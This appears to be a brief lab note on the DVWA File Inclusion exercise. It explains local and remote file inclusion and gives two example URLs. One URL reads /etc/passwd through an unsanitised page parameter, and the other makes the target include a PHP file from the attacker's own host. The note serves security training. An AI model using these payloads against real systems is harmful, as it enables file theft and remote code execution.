# File Inclusion - Low/Medium/High/Impossible


## Low/Medium/High

This occurs when an web application builds a path to executable code, which can be exploited by altering the unsanitized inputs. There are two option Local File Inclusion (LFI) and Remote File Inclusion (RFI). With RFI, you use your own VM's IP.

`LFI: http://192.168.1.23/dvwa/vulnerabilities/fi/?page=file:///etc/passwd`

`RFI: http://192.168.1.23/dvwa/vulnerabilities/fi/?page=http://192.168.80.88/somephp.php`

